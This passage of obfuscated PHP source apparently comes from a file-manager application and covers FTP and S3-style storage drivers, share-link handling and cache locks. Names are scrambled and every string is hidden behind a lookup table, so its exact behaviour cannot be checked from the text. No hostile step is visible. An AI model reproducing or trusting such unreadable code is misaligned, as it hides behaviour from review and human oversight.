$Ÿ±ùÍŒ[$£úÛÊÔæ[809]]; } $œ­ÙÔ”Å = Input::get($£úÛÊÔæ[508], $£úÛÊÔæ[7], $£úÛÊÔæ[2076], array($£úÛÊÔæ[1994], $£úÛÊÔæ[502])); $Ùì§¶š = array($£úÛÊÔæ[500] => $£úÛÊÔæ[501], $£úÛÊÔæ[502] => $£úÛÊÔæ[503]); $ç¡Àú = $£úÛÊÔæ[2080] . $Ùì§¶š[$œ­ÙÔ”Å]; $Ò“¤Óç = Model($£úÛÊÔæ[2072])->where($µÊì³‚ë)->order($ç¡Àú)->selectPage(20); if (empty($Ò“¤Óç[$£úÛÊÔæ[413]])) { return array(); } $¿ŠÈ†ğÛ = array_to_keyvalue_group($Ò“¤Óç[$£úÛÊÔæ[413]], $£úÛÊÔæ[809], $£úÛÊÔæ[643]); if (!empty($¿ŠÈ†ğÛ[0])) { $Ÿ±ùÍŒ = $¿ŠÈ†ğÛ[0]; $µÊì³‚ë = array($£úÛÊÔæ[643] => array($£úÛÊÔæ[7], $Ÿ±ùÍŒ)); $ıŠüÇìû = $this->where($µÊì³‚ë)->field($£úÛÊÔæ[643])->select(); $ıŠüÇìû = array_to_keyvalue($ıŠüÇìû, $£úÛÊÔæ[12], $£úÛÊÔæ[643]); $ê‘ûÖçµ = array_diff($Ÿ±ùÍŒ, $ıŠüÇìû); if (!empty($ê‘ûÖçµ)) { foreach ($Ò“¤Óç[$£úÛÊÔæ[413]] as $½İ«æ›å => $ÙË„Ÿ³É) { if (in_array($ÙË„Ÿ³É[$£úÛÊÔæ[643]], $ê‘ûÖçµ)) { unset($Ò“¤Óç[$£úÛÊÔæ[413]][$½İ«æ›å]); } } } } $this->_listDataApply($Ò“¤Óç[$£úÛÊÔæ[413]]); return $Ò“¤Óç; } public function reportStatus($¡Ğ”ÖÀş) { $¶©Ÿ¸· =& $_SERVER[íû‘ş´]; $¦ñ¤áß = array($¶©Ÿ¸·[443] => $¡Ğ”ÖÀş[$¶©Ÿ¸·[443]]); $«ı±«Ø = Model($¶©Ÿ¸·[2072])->where($¦ñ¤áß)->field($¶©Ÿ¸·[2081])->find(); if (!$«ı±«Ø) { return !1; } $½Âî¦‚¶ = array($¶©Ÿ¸·[809] => $¡Ğ”ÖÀş[$¶©Ÿ¸·[809]]); if ($¡Ğ”ÖÀş[$¶©Ÿ¸·[809]] == $¶©Ÿ¸·[2077] && $«ı±«Ø[$¶©Ÿ¸·[809]] == $¶©Ÿ¸·[2077]) { $½Âî¦‚¶[$¶©Ÿ¸·[809]] = 0; } $Ø‡ğßŞô = Model($¶©Ÿ¸·[2072])->where($¦ñ¤áß)->save($½Âî¦‚¶); if ($¡Ğ”ÖÀş[$¶©Ÿ¸·[809]] == $¶©Ÿ¸·[487]) { if ($«ı±«Ø[$¶©Ÿ¸·[518]] != $¶©Ÿ¸·[212] && $this->shareFileMeta($«ı±«Ø[$¶©Ÿ¸·[518]])) { $this->shareFileMeta($«ı±«Ø[$¶©Ÿ¸·[518]], 0); } $this->remove($«ı±«Ø[$¶©Ÿ¸·[643]]); return !0; } if ($Ø‡ğßŞô && $¡Ğ”ÖÀş[$¶©Ÿ¸·[809]] == $¶©Ÿ¸·[2077]) { $¾â‹¶èâ = $½Âî¦‚¶[$¶©Ÿ¸·[809]] == $¶©Ÿ¸·[2077] ? 1 : 0; $this->shareFileMeta($«ı±«Ø[$¶©Ÿ¸·[518]], $¾â‹¶èâ); $this->removeByFile($«ı±«Ø[$¶©Ÿ¸·[518]]); } return $Ø‡ğßŞô; } private function removeByFile($«èŠÒÜê) { $û—ÓªÚ =& $_SERVER[íû‘ş´]; $Â˜İ¯²Å = Model($û—ÓªÚ[884])->where(array($û—ÓªÚ[518] => $«èŠÒÜê))->field($û—ÓªÚ[181])->select(); $¶Í™Ø¼ = array_to_keyvalue($Â˜İ¯²Å, $û—ÓªÚ[12], $û—ÓªÚ[181]); $ò¿’ÃÓŞ = array($û—ÓªÚ[181] => array($û—ÓªÚ[7], $¶Í™Ø¼), $û—ÓªÚ[540] => 1); $Â˜İ¯²Å = $this->where($ò¿’ÃÓŞ)->field($û—ÓªÚ[643])->select(); if (empty($Â˜İ¯²Å)) { return; } $™—ğ‡Íß = array_to_keyvalue($Â˜İ¯²Å, $û—ÓªÚ[12], $û—ÓªÚ[643]); $this->remove($™—ğ‡Íß); } private function shareFileMeta($£ö¯ê«Ê, $¦ï­—Ùô = null) { $–®ÅÒóâ =& $_SERVER[íû‘ş´]; $×¶™µÈí = array($–®ÅÒóâ[518] => $£ö¯ê«Ê, $–®ÅÒóâ[94] => $–®ÅÒóâ[2082]); if (is_null($¦ï­—Ùô)) { return Model($–®ÅÒóâ[2083])->where($×¶™µÈí)->find(); } $×¶™µÈí[$–®ÅÒóâ[418]] = $¦ï­—Ùô; Model($–®ÅÒóâ[2083])->add($×¶™µÈí, array(), !0); } } goto CºİÈ¨ÈÏ; cæ‘¸¿Ù‘ï: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($¶ØÒ¥ßù) { $this->pathParse = $¶ØÒ¥ßù; } protected function infoParse($ä–®Â±­, $¬Ë—¼¸” = false) { $’¬‡ÖßÌ =& $_SERVER[íû‘ş´]; return Action($’¬‡ÖßÌ[1232])->sharePathInfo($this->pathParse[$’¬‡ÖßÌ[84]], !0, $¬Ë—¼¸”); } public function listPath($šœ‰Õ·, $É›ÅŞ›¬ = false) { $Ëó»—éÑ =& $_SERVER[íû‘ş´]; $ì•‹ùƒ¬ = IO::listPath($šœ‰Õ·, $É›ÅŞ›¬); if (!$ì•‹ùƒ¬) { return $ì•‹ùƒ¬; } if (is_array($ì•‹ùƒ¬[$Ëó»—éÑ[1398]])) { $œÂŸ³Â = Action($Ëó»—éÑ[1407])->parsePathChildren($ì•‹ùƒ¬[$Ëó»—éÑ[1398]], array($Ëó»—éÑ[472] => $šœ‰Õ·)); $ì•‹ùƒ¬[$Ëó»—éÑ[1398]] = Action($Ëó»—éÑ[1232])->shareItemInfo($œÂŸ³Â); } foreach ($ì•‹ùƒ¬ as $ñ˜‚±Ç¸ => $äÃÇ²©¥) { if (!in_array($ñ˜‚±Ç¸, array($Ëó»—éÑ[83], $Ëó»—éÑ[82]))) { continue; } foreach ($äÃÇ²©¥ as $Ô²ÔŸ¨ú => $œÂŸ³Â) { $œÂŸ³Â = Action($Ëó»—éÑ[1407])->parsePathChildren($œÂŸ³Â, array($Ëó»—éÑ[472] => $šœ‰Õ·)); $ì•‹ùƒ¬[$ñ˜‚±Ç¸][$Ô²ÔŸ¨ú] = Action($Ëó»—éÑ[1232])->shareItemInfo($œÂŸ³Â); } } return $ì•‹ùƒ¬; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($Âøùì) { parent::__construct($Âøùì); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¼™­Ûêë) { parent::__construct($¼™­Ûêë); $this->signatureVersion($_SERVER[íû‘ş´][231]); } public function uploadFormData($ş»®Ëîò, $½²ÍĞ‡ = 3600) { $ÜŒäî‡ =& $_SERVER[íû‘ş´]; $‚ü£ª†¤ = $ÜŒäî‡[213]; $İ££ëºí = $ÜŒäî‡[253]; $“õ›†Àµ = $ÜŒäî‡[62]; $ÛŠÜÌŸĞ = gmdate($ÜŒäî‡[254]); $¢ïİœüÃ = gmdate($ÜŒäî‡[255]); $ˆ¶ë†Õ² = $ÜŒäî‡[256]; $ÇÌ©äÄ = $½²ÍĞ‡ . $ÜŒäî‡[12]; $Œ„Şô–± = $ÜŒäî‡[257]; $†Ä²äÈŸ = array($this->accessKey, $¢ïİœüÃ, $this->region, $“õ›†Àµ, $ˆ¶ë†Õ²); $¡È¦ƒş¨ = implode($ÜŒäî‡[8], $†Ä²äÈŸ); $‘ğŞìÌç = array($ÜŒäî‡[258] => gmdate($ÜŒäî‡[1382], strtotime($ÜŒäî‡[260])), $ÜŒäî‡[261] => array(array($ÜŒäî‡[262] => $this->bucket), array($ÜŒäî‡[263] => $‚ü£ª†¤), array($ÜŒäî‡[264], $ÜŒäî‡[265], $ÜŒäî‡[12]), array($ÜŒäî‡[264], $ÜŒäî‡[266], $ÜŒäî‡[12]), array($ÜŒäî‡[264], $ÜŒäî‡[267], $ÜŒäî‡[12]), array($ÜŒäî‡[268] => $Œ„Şô–±), array($ÜŒäî‡[269] => $¡È¦ƒş¨), array($ÜŒäî‡[270] => $İ££ëºí), array($ÜŒäî‡[271] => $ÛŠÜÌŸĞ), array($ÜŒäî‡[272] => $ÇÌ©äÄ))); $şÕ–éÅ = base64_encode(json_encode($‘ğŞìÌç)); $‘ŠëÍ”ô = hash_hmac($ÜŒäî‡[273], $¢ïİœüÃ, $ÜŒäî‡[274] . $this->secret, !0); $şáò§Û« = hash_hmac($ÜŒäî‡[273], $this->region, $‘ŠëÍ”ô, !0); $‡ÂÌ°¤¼ = hash_hmac($ÜŒäî‡[273], $“õ›†Àµ, $şáò§Û«, !0); $¿Æ„€ë° = hash_hmac($ÜŒäî‡[273], $ˆ¶ë†Õ², $‡ÂÌ°¤¼, !0); $ìÀ’Ğâ = hash_hmac($ÜŒäî‡[273], $şÕ–éÅ, $¿Æ„€ë°); $´£³£Ï” = array($ÜŒäî‡[230] => $ÜŒäî‡[12], $ÜŒäî‡[275] => $ÜŒäî‡[12], $ÜŒäî‡[263] => $‚ü£ª†¤, $ÜŒäî‡[268] => $Œ„Şô–±, $ÜŒäî‡[276] => $şÕ–éÅ, $ÜŒäî‡[277] => $¡È¦ƒş¨, $ÜŒäî‡[278] => $İ££ëºí, $ÜŒäî‡[279] => $ÛŠÜÌŸĞ, $ÜŒäî‡[280] => $ÇÌ©äÄ, $ÜŒäî‡[281] => $ìÀ’Ğâ, $ÜŒäî‡[196] => $this->getHost()); return $´£³£Ï”; } } goto aÂ‚¢„»ƒ; A ˜œ‘ôàË: class CacheLockMemcached { public function lock($Ÿ£şñ«š, $»Ø¾áÇ = 0) { $µçïû¤ñ = Cache::init(); $àøÂ¤Ëä = microtime(!0) + $»Ø¾áÇ; while (microtime(!0) < $àøÂ¤Ëä) { $İšæåìé = $µçïû¤ñ->get($Ÿ£şñ«š); if (!$İšæåìé || $İšæåìé < microtime(!0)) { $‹óÇà¥‡ = $µçïû¤ñ->handle->add($Ÿ£şñ«š, $àøÂ¤Ëä, $»Ø¾áÇ); if ($‹óÇà¥‡) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($²†ûåî×) { return Cache::init()->get($²†ûåî×); } public function unlock($„¿ºÁ÷) { return Cache::init()->remove($„¿ºÁ÷); } } class CacheLockDatabase { public function lock($ÕšæüåŸ, $Íü—ë¿ = 0) { $ŠÑĞà¢ = Model($_SERVER[íû‘ş´][888]); $î¸Ï›é» = microtime(!0) + $Íü—ë¿; while (microtime(!0) < $î¸Ï›é») { $ÒÂÜ÷ = $ŠÑĞà¢->get($ÕšæüåŸ); if (!$ÒÂÜ÷ || $ÒÂÜ÷ < microtime(!0)) { $®áÒ—“ú = $ŠÑĞà¢->set($ÕšæüåŸ, $î¸Ï›é»); if ($®áÒ—“ú) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÊÍÄ©¯¼) { return Model($_SERVER[íû‘ş´][888])->get($ÊÍÄ©¯¼); } public function unlock($í‚–Ôƒ’) { Model($_SERVER[íû‘ş´][888])->remove($í‚–Ôƒ’); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($»Ûüîş, $Ñ¡«¬äŞ) { $•ùê×­– =& $_SERVER[íû‘ş´]; if (!class_exists($•ùê×­–[926])) { show_json($•ùê×­–[927], !1); } $this->cacheTime = $Ñ¡«¬äŞ; $this->handle = new Memcached(); if (is_array($»Ûüîş[$•ùê×­–[928]]) && count($»Ûüîş[$•ùê×­–[928]]) >= 1) { foreach ($»Ûüîş[$•ùê×­–[928]] as $¤ó±œ’×) { $–…Ùè«– = explode($•ùê×­–[4], $¤ó±œ’×); $this->handle->addServer($–…Ùè«–[0], $–…Ùè«–[1]); } } else { $this->handle->addServer($»Ûüîş[$•ùê×­–[196]], $»Ûüîş[$•ùê×­–[197]]); } } public function set($ÇÛÂÛ÷…, $Ô˜¬¨, $Û×¢ŞÖ‚ = false) { $Û×¢ŞÖ‚ = $Û×¢ŞÖ‚ ? $Û×¢ŞÖ‚ : $this->cacheTime; return $this->handle->set($ÇÛÂÛ÷…, $Ô˜¬¨, $Û×¢ŞÖ‚); } public function get($ÆÊ’ôÂÓ) { return $this->handle->get($ÆÊ’ôÂÓ); } public function remove($ÜÁŞ†á) { return $this->handle->delete($ÜÁŞ†á); } public function deleteAll() { return $this->handle->flush(); } } goto FÆé‰ÂØ™Ú; aÂ‚¢„»ƒ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($Ê•’ÄÛ™) { parent::__construct(); if (count($Ê•’ÄÛ™) > 0) { $this->_init($Ê•’ÄÛ™); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¼¬úİ’ı) { $Ï‚­“™Ó =& $_SERVER[íû‘ş´]; global $config; $this->appCharset = $config[$Ï‚­“™Ó[1408]]; $this->systemCharset = $config[$Ï‚­“™Ó[1409]]; if (isset($¼¬úİ’ı[$Ï‚­“™Ó[1410]]) && $¼¬úİ’ı[$Ï‚­“™Ó[1410]]) { $this->systemCharset = $¼¬úİ’ı[$Ï‚­“™Ó[1410]]; } } public function iconvApp($®ˆş²Æ‰) { return $this->iconvTo($®ˆş²Æ‰, $this->systemCharset, $this->appCharset); } public function iconvSystem($†ˆŸ‚Õ) { return $this->iconvTo($†ˆŸ‚Õ, $this->appCharset, $this->systemCharset); } public function getPathOuter($Í¤ĞŞı) { $Ö”’±İî =& $_SERVER[íû‘ş´]; $Şšî³•Ú = $this->iconvApp($this->pathBase); $Í¤ĞŞı = $this->iconvApp($Í¤ĞŞı); if (substr($Şšî³•Ú, 0, 2) == $Ö”’±İî[1411]) { $Şšî³•Ú = BASIC_PATH . substr($Şšî³•Ú, 2); } if (substr($Í¤ĞŞı, 0, 2) == $Ö”’±İî[1411]) { $Í¤ĞŞı = BASIC_PATH . substr($Í¤ĞŞı, 2); } $Şšî³•Ú = KodIO::clear($Şšî³•Ú); $Í¤ĞŞı = KodIO::clear($Í¤ĞŞı); $Í¤ĞŞı = substr($Í¤ĞŞı, strlen($Şšî³•Ú)); if (empty($this->pathDriver)) { return $Í¤ĞŞı; } return $this->pathDriver . $Ö”’±İî[8] . ltrim($Í¤ĞŞı, $Ö”’±İî[8]); } private function _init($İÂÈØÔÏ = array()) { $º°úÛ€ =& $_SERVER[íû‘ş´]; if (!function_exists($º°úÛ€[1412])) { throw new Exception(LNG($º°úÛ€[1413])); } $this->config = $İÂÈØÔÏ; $this->charsetReset($İÂÈØÔÏ); foreach ($İÂÈØÔÏ as $·üıÀ¡’ => $ÉÏïĞÓ­) { if (isset($this->{$·üıÀ¡’})) { $this->{$·üıÀ¡’} = $ÉÏïĞÓ­; } } return $this->_login($İÂÈØÔÏ); } private function _login($Æ©µƒÍ) { $¬·ªï† =& $_SERVER[íû‘ş´]; static $¿¬»Ç  = array(); $Õš¢¥Ş¯ = md5(json_encode($Æ©µƒÍ)); if (isset($¿¬»Ç [$Õš¢¥Ş¯])) { foreach ($¿¬»Ç [$Õš¢¥Ş¯] as $ôÕ–§Õ¡ => $Âô©¼) { $this->{$ôÕ–§Õ¡} = $Âô©¼; } return !0; } $¢ÇÒë› = parse_url(trim($this->server, $¬·ªï†[8])); $this->host = $¢ÇÒë›[$¬·ªï†[196]]; $ËÄÅ‹ˆ­ = isset($¢ÇÒë›[$¬·ªï†[195]]) && $¢ÇÒë›[$¬·ªï†[195]] == $¬·ªï†[1414] ? !0 : !1; $this->scheme = $ËÄÅ‹ˆ­ ? $¬·ªï†[1415] : $¬·ªï†[1416]; $this->port = isset($¢ÇÒë›[$¬·ªï†[197]]) ? $¢ÇÒë›[$¬·ªï†[197]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ıÁÖ¹ªÌ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ò¤àÎÊÑ = $this->pasv == $¬·ªï†[88] ? !0 : !1; @ftp_pasv($this->connect, $ò¤àÎÊÑ); $¿¬»Ç [$Õš¢¥Ş¯] = array($¬·ªï†[1417] => $this->connect, $¬·ªï†[196] => $this->host, $¬·ªï†[195] => $this->scheme, $¬·ªï†[197] => $this->port); return $ıÁÖ¹ªÌ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($†ˆ •ûí, $‹³Ç·Ïø = '', $ıÙ‹ç’š = REPEAT_RENAME) { if ($this->setContent($†ˆ •ûí, $‹³Ç·Ïø)) { return $this->getPathOuter($†ˆ •ûí); } return !1; } public function mkdir($Øî‡ÏÅ€, $Ì¥ø‘”¸ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Øî‡ÏÅ€ = $this->iconvSystem($Øî‡ÏÅ€); if ($this->_isFolder($Øî‡ÏÅ€) || @ftp_mkdir($this->connect, $Øî‡ÏÅ€)) { return $this->getPathOuter($Øî‡ÏÅ€); } if (!$this->mkdir($this->pathFather($Øî‡ÏÅ€))) { return !1; } if ($Øî‡ÏÅ€ = @ftp_mkdir($this->connect, $Øî‡ÏÅ€)) { return $this->getPathOuter($Øî‡ÏÅ€); } return !1; } public function copyFile($¥ÙæåºÏ, $öÇ‹–á) { if (!$this->_isconn()) { return !1; } $Ğ¹”—‰¥ = $this->pathThis($this->iconvSystem($¥ÙæåºÏ)); $ÎÜºÚ¾± = $this->tempFile($Ğ¹”—‰¥); $ó—š‹Ÿâ = $this->iconvApp($ÎÜºÚ¾±); $this->download($¥ÙæåºÏ, $ó—š‹Ÿâ); $¼øÊ‚¡€ = $this->upload($öÇ‹–á, $ó—š‹Ÿâ); $this->tempFileRemve($ÎÜºÚ¾±); return $¼øÊ‚¡€; } public function moveFile($¯ı­ç˜Â, $ØÚœÂËª) { if (!$this->_isconn()) { return !1; } $¯ı­ç˜Â = $this->iconvSystem($¯ı­ç˜Â); $ØÚœÂËª = $this->iconvSystem($ØÚœÂËª); $ä¯›İá = @ftp_rename($this->connect, $¯ı­ç˜Â, $ØÚœÂËª); return $ä¯›İá ? $this->getPathOuter($ØÚœÂËª) : !1; } public function delFile($«íí«Ô¸) { if (!$this->_isconn()) { return !1; } $«íí«Ô¸ = $this->iconvSystem($«íí«Ô¸); return @ftp_delete($this->connect, $«íí«Ô¸); } public function delFolder($úêÏ™õ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $˜„·œè¢ = $ïĞ²ï¬ô = array(); $this->fileList($úêÏ™õ, $˜„·œè¢, $ïĞ²ï¬ô, !0); $this->listItemCache = !0; foreach ($ïĞ²ï¬ô as $¼™”Õ†ı) { $â†¹ˆÃö = $this->iconvSystem($¼™”Õ†ı[$_SERVER[íû‘ş´][32]]); $Æ©úÚ¸ = @ftp_delete($this->connect, $â†¹ˆÃö); if (!$Æ©úÚ¸) { return !1; } } foreach ($˜„·œè¢ as $â†¹ˆÃö) { $â†¹ˆÃö = $this->iconvSystem($â†¹ˆÃö); $Æ©úÚ¸ = @ftp_rmdir($this->connect, $â†¹ˆÃö); if (!$Æ©úÚ¸) { return !1; } } $úêÏ™õ = $this->iconvSystem($úêÏ™õ); return @ftp_rmdir($this->connect, $úêÏ™õ); } public function rename($ä´Ü«›ã, $Áææ¿Ğ) { $×§ùàü¼ =& $_SERVER[íû‘ş´]; if (!$this->_isconn()) { return !1; } $Éãà‘×â = $this->fileNameAuto($this->pathFather($ä´Ü«›ã), $Áææ¿Ğ); $Éãà‘×â = $this->iconvSystem($Éãà‘×â); $ä´Ü«›ã = $this->iconvSystem($ä´Ü«›ã); $œ’““ú© = $this->pathFather($ä´Ü«›ã); $´Ãá‚Äï = rtrim($œ’““ú©, $×§ùàü¼[8]) . $×§ùàü¼[8] . $Éãà‘×â; $¥°Â²‹Û = @ftp_rename($this->connect, $ä´Ü«›ã, $´Ãá‚Äï); $´Ãá‚Äï = $this->iconvApp($´Ãá‚Äï); return $¥°Â²‹Û ? $this->getPathOuter($´Ãá‚Äï) : !1; } private function folderInfo($ Ç®§›à, $Àø¢·ò = false) { $ï‡Ë‚Ù =& $_SERVER[íû‘ş´]; $ö«’·‘¹ = array($ï‡Ë‚Ù[32] => $this->pathThis($ Ç®§›à), $ï‡Ë‚Ù[84] => $this->getPathOuter($ï‡Ë‚Ù[8] . $ Ç®§›à), $ï‡Ë‚Ù[33] => $ï‡Ë‚Ù[75]); if ($Àø¢·ò) { return $ö«’·‘¹; } $ö«’·‘¹[$ï‡Ë‚Ù[215]] = $ö«’·‘¹[$ï‡Ë‚Ù[85]] = 0; $ö«’·‘¹[$ï‡Ë‚Ù[216]] = $ö«’·‘¹[$ï‡Ë‚Ù[217]] = !0; return $ö«’·‘¹; } private function fileInfo($ı£ô…­–, $’Ù“ê­Ô = false, $Ãäå¡Ô = array()) { $”’§À¾ =& $_SERVER[íû‘ş´]; $õ©»— = array($”’§À¾[32] => $this->pathThis($ı£ô…­–), $”’§À¾[84] => $this->getPathOuter($”’§À¾[8] . $ı£ô…­–), $”’§À¾[33] => $”’§À¾[214], $”’§À¾[76] => isset($Ãäå¡Ô[$”’§À¾[76]]) ? $Ãäå¡Ô[$”’§À¾[76]] : 0, $”’§À¾[175] => $this->ext($ı£ô…­–)); if ($’Ù“ê­Ô) { return $õ©»—; } $õ©»—[$”’§À¾[215]] = $õ©»—[$”’§À¾[85]] = 0; $õ©»—[$”’§À¾[216]] = $õ©»—[$”’§À¾[217]] = !0; $ğéúÉ = $this->iconvSystem($ı£ô…­–); $õ©»—[$”’§À¾[85]] = @ftp_mdtm($this->connect, $ğéúÉ); if (empty($Ãäå¡Ô)) { $Ãäå¡Ô = $this->objectMeta($ı£ô…­–); if (!$Ãäå¡Ô) { return $õ©»—; } } $õ©»—[$”’§À¾[76]] = $Ãäå¡Ô[$”’§À¾[76]]; return $õ©»—; } public function size($ĞìŸËèÛ) { $ÃÔÔ„Å« = $this->objectMeta($ĞìŸËèÛ); return $ÃÔÔ„Å« ? $ÃÔÔ„Å«[$_SERVER[íû‘ş´][76]] : 0; } public function info($¼à´“ôÁ) { if ($this->isFile($¼à´“ôÁ)) { return $this->fileInfo($¼à´“ôÁ, 0); } else { if ($this->isFolder($¼à´“ôÁ)) { return $this->folderInfo($¼à´“ôÁ); } } return !1; } private function fileList($¶Ç«Ó´÷, &$ù°¡á³’, &$Êüí­’‚, $œ·õˆ‘½ = false) { $†Õ³¡Îé =& $_SERVER[íû‘ş´]; $¶Ç«Ó´÷ = $this->iconvSystem($¶Ç«Ó´÷); if (!$this->isFolder($¶Ç«Ó´÷)) { return !1; } @ftp_chdir($this->connect, $†Õ³¡Îé[8]); $¶Ç«Ó´÷ = rtrim($¶Ç«Ó´÷, $†Õ³¡Îé[8]) . $†Õ³¡Îé[8]; check_abort(); $Ô—˜Ç« = @ftp_rawlist($this->connect, $¶Ç«Ó´÷); if (!$Ô—˜Ç«) { $Ô—˜Ç« = array(); } $¸–óÈ½Ú = array($†Õ³¡Îé[10] => 1, $†Õ³¡Îé[1336] => 1); foreach ($Ô—˜Ç« as $€ş“ßœ) { $¡á›êóÔ = $this->_listItem($€ş“ßœ); if ($¡á›êóÔ[0] == $†Õ³¡Îé[817]) { continue; } $±¶Üäú¦ = $¡á›êóÔ[8]; if (empty($±¶Üäú¦) && $±¶Üäú¦ !== $†Õ³¡Îé[212] || isset($¸–óÈ½Ú[$±¶Üäú¦])) { continue; } $±¶Üäú¦ = $this->iconvApp($¶Ç«Ó´÷ . ltrim($±¶Üäú¦, $†Õ³¡Îé[8])); $º’Ğş«ª = array($†Õ³¡Îé[32] => $±¶Üäú¦, $†Õ³¡Îé[33] => $†Õ³¡Îé[214], $†Õ³¡Îé[76] => $¡á›êóÔ[4]); if (substr($€ş“ßœ, 0, 1) == $†Õ³¡Îé[1418]) { $º’Ğş«ª[$†Õ³¡Îé[33]] = $†Õ³¡Îé[75]; $º’Ğş«ª[$†Õ³¡Îé[76]] = 0; } $ÈÇî¬ïù = $º’Ğş«ª[$†Õ³¡Îé[33]] == $†Õ³¡Îé[75] ? !0 : !1; $this->cacheMethodInfoSet($±¶Üäú¦, $ÈÇî¬ïù, $º’Ğş«ª); if ($ÈÇî¬ïù) { $ù°¡á³’[] = $±¶Üäú¦; if ($œ·õˆ‘½) { $this->fileList($±¶Üäú¦, $ù°¡á³’, $Êüí­’‚, $œ·õˆ‘½); } continue; } $Êüí­’‚[] = $º’Ğş«ª; } $this->cacheMethodInfoSet($¶Ç«Ó´÷, !0); } private function _listItem($³¸ÄÙì) { if (empty($³¸ÄÙì)) { return array(); } $ª—ÏÍë‡ = preg_split($_SERVER[íû‘ş´][1419], $³¸ÄÙì); if (count($ª—ÏÍë‡) <= 9) { return $ª—ÏÍë‡; } $ª—ÏÍë‡[8] = trim(substr($³¸ÄÙì, strpos($³¸ÄÙì, $ª—ÏÍë‡[7]) + strlen($ª—ÏÍë‡[7]))); return array_splice($ª—ÏÍë‡, 0, 9); } public function listPath($ö›€«Á°, $“ŠÔØİä = false) { $”ŠÁâÔµ =& $_SERVER[íû‘ş´]; if (!$this->_isconn()) { return !1; } $ªºÚ¡ï = $°Š›Ç…Ñ = array(); $this->fileList($ö›€«Á°, $ªºÚ¡ï, $°Š›Ç…Ñ); foreach ($ªºÚ¡ï as $«úÄ¿ü‚ => $‹¢òÔá) { $ªºÚ¡ï[$«úÄ¿ü‚] = $this->folderInfo($‹¢òÔá, $“ŠÔØİä); } foreach ($°Š›Ç…Ñ as $«úÄ¿ü‚ => $‹¢òÔá) { $°Š›Ç…Ñ[$«úÄ¿ü‚] = $this->fileInfo($‹¢òÔá[$”ŠÁâÔµ[32]], $“ŠÔØİä, $‹¢òÔá); } return array($”ŠÁâÔµ[82] => $ªºÚ¡ï, $”ŠÁâÔµ[83] => $°Š›Ç…Ñ); } public function has($—å¼ù’†, $…°´áê‰ = false, $”©ìáù¶ = true) { $ŒÈÌı  =& $_SERVER[íû‘ş´]; $†õÏ§‚‰ = $à³æ÷…ö = array(); $§ òñèÚ = $…°´áê‰ ? !0 : !1; $this->fileList($—å¼ù’†, $†õÏ§‚‰, $à³æ÷…ö, $§ òñèÚ); if ($…°´áê‰) { return array($ŒÈÌı [223] => count($à³æ÷…ö), $ŒÈÌı [224] => count($†õÏ§‚‰)); } if ($”©ìáù¶) { if (count($à³æ÷…ö)) { return !0; } } else { if (count($†õÏ§‚‰)) { return !0; } } return !1; } public function listAll($Ô–±ªÁı) { $à´ÀŠå” =& $_SERVER[íû‘ş´]; if (!$this->_isconn()) { return !1; } $ğı–ÎŞÓ = $•ÛÍŠØ‘ = array(); $this->fileList($Ô–±ªÁı, $ğı–ÎŞÓ, $•ÛÍŠØ‘, !0); $Æ»Ñ»ç‹ = array_to_keyvalue($•ÛÍŠØ‘, $à´ÀŠå”[32]); foreach ($ğı–ÎŞÓ as $ÅøÈ¾û®) { if (is_string($ÅøÈ¾û®)) { $Æ»Ñ»ç‹[$ÅøÈ¾û®] = array($à´ÀŠå”[76] => 0); } } return $this->listAllFiles($Ô–±ªÁı, $Æ»Ñ»ç‹); } public function getContent($ëÇÌØ¹à) { if (!$this->_isconn()) { return !1; } $ëÇÌØ¹à = $this->iconvSystem($ëÇÌØ¹à); return $this->fileSubstr($ëÇÌØ¹à); } public function setContent($Ğç®ğ¡­, $Ã…»Ö£ = '') { if (!$this->_isconn()) { return !1; } $©’ÄÆš = $this->pathThis($this->iconvSystem($Ğç®ğ¡­)); $‰à¢Ã = $this->tempFile($©’ÄÆš); file_put_contents($‰à¢Ã, $Ã…»Ö£); $Ùì·áÊ§ = $this->upload($Ğç®ğ¡­, $this->iconvApp($‰à¢Ã)); $this->tempFileRemve($‰à¢Ã); return $Ùì·áÊ§; } public function fileSubstr($¸Ã¨ÙÏ, $ëŸ–Ú¤Å = 0, $†“ã¡¥õ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($¸Ã¨ÙÏ, $ëŸ–Ú¤Å, $†“ã¡¥õ); } private function ftpRequest($çú­×óŠ, $Åª‰”¬Ñ = 0, $ËÂÚ¢ = false) { $çú­×óŠ = $this->iconvSystem($çú­×óŠ); $®’¢õ À = $this->scheme . $this->host . $_SERVER[íû‘ş´][4] . $this->port; $Æ¡Ã“ã… = curl_init(); curl_setopt($Æ¡Ã“ã…, CURLOPT_URL, $®’¢õ À . $this->pathEncode($çú­×óŠ)); curl_setopt($Æ¡Ã“ã…, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ËÂÚ¢) { $Ñ—§•¥å = $Åª‰”¬Ñ + $ËÂÚ¢ - 1; curl_setopt($Æ¡Ã“ã…, CURLOPT_RANGE, "{$Åª‰”¬Ñ}\x2d{$Ñ—§•¥å}"); } curl_setopt($Æ¡Ã“ã…, CURLOPT_RETURNTRANSFER, 1); $êí÷­Úå = curl_exec($Æ¡Ã“ã…); curl_close($Æ¡Ã“ã…); return $êí÷­Úå; } public function upload($˜ŞÂŸ£¾, $„Ø„Â´“, $Œ±Ó³  = false, $ª›É†”ù = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($˜ŞÂŸ£¾))) { return !1; } $˜ŞÂŸ£¾ = $this->iconvSystem($˜ŞÂŸ£¾); $„Ø„Â´“ = $this->iconvSystem($„Ø„Â´“); $„¼Øäğƒ = 